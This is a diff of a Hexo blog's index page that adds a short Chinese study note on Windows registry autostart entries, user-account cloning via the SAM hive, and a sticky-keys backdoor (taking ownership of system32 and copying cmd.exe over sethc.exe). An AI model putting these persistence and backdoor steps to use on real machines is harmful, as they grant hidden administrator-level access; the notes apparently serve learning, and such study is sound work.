@@ -64,6 +64,62 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-注册表自启动和粘滞键后门" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" class="article-date">
+  <time datetime="2021-07-12T03:13:16.000Z" itemprop="datePublished">2021-07-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/">注册表自启动和粘滞键后门</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>注册表：</p>
+<p>​    数据类型：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">REG_SZ：字符串：文本字符串</span><br><span class="line">REG_MULTI_SZ：多字符串值：含有多个文本值的字符串</span><br><span class="line">REG_BINARY：二进制数：二进制值，以十六进制显示，</span><br><span class="line">REG_DWORD：双字值；一个32位的二进制值，显示为8位的十六进制值</span><br></pre></td></tr></table></figure>
+
+<p>​    创建注册表：   regedit</p>
+<p>自启动路径：</p>
+<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RUN</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run &#x2F;v hh &#x2F;d &quot;calc.exe&quot; &#x2F;f</span><br><span class="line">reg add keyname ... 创建注册表</span><br><span class="line">&#x2F;v 注册表取名</span><br><span class="line">&#x2F;d 要执行的命令或者程序</span><br><span class="line">&#x2F;f 强制覆盖</span><br><span class="line"></span><br><span class="line">用户克隆</span><br><span class="line">注册表中sam文件下的administrator账户对应的目录文件中的F值覆盖掉普通用户对应目录的F值，权限会被继承</span><br></pre></td></tr></table></figure>
+
+<p>自启动文件夹：win + R –&gt; shell:startup</p>
+<p>​    C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
+<p>服务配置：win + R –&gt;msconfig</p>
+<p>UAC：user account control（用户账户控制）</p>
+<p>​        最底下：默认以管理员权限运行</p>
+<p>粘滞键后门：</p>
+<p>​    原理：通过覆盖sethc.exe文件运行cmd</p>
+<p>​    1. takeown /F c:\windwos\system32* /A /R</p>
+<p>​    2.cacls c:\windwos\system32\* /T /E /G administrators:F</p>
+<p>​    3.copy cmd.exe sethc.exe</p>
+<p>​    4.连续按5次shift键呼出cmd</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" data-id="ckr01zoau0006fkvjc73zfanp" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-基础命令" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" class="article-date">
@@ -131,7 +187,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" data-id="ckr01tkx00005acvj71nbfqpw" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" data-id="ckr01zoaq0005fkvjglc04877" class="article-share-link">Share</a>
       
       
     </footer>
@@ -168,7 +224,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" data-id="ckr01tkwy0003acvj6t8y7x4b" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" data-id="ckr01zoao0003fkvjdm0m798v" class="article-share-link">Share</a>
       
       
     </footer>
@@ -205,7 +261,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" data-id="ckr01tkww0002acvj00q5h7ly" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" data-id="ckr01zoan0002fkvjd2v0f51d" class="article-share-link">Share</a>
       
       
     </footer>
@@ -273,7 +329,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckr01tkwq0000acvj1h6q14x7" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckr01zoag0000fkvj3ow8bxev" class="article-share-link">Share</a>
       
       
     </footer>
@@ -310,7 +366,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="ckr01tkwu0001acvj8gbo0u1q" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="ckr01zoal0001fkvj383p5y7d" class="article-share-link">Share</a>
       
       
     </footer>
@@ -359,7 +415,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="ckr01tkwz0004acvj5t2357n3" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="ckr01zoao0004fkvje7n574mc" class="article-share-link">Share</a>
       
       
     </footer>
@@ -400,6 +456,10 @@ default:
       <ul>
         
           <li>
+            <a href="/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/">注册表自启动和粘滞键后门</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/">基础命令</a>
           </li>
         
@@ -413,10 +473,6 @@ default:
         
           <li>
             <a href="/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">PHP学习笔记</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/11/Hello/">你好，Hexo</a>
           </li>
         
       </ul>
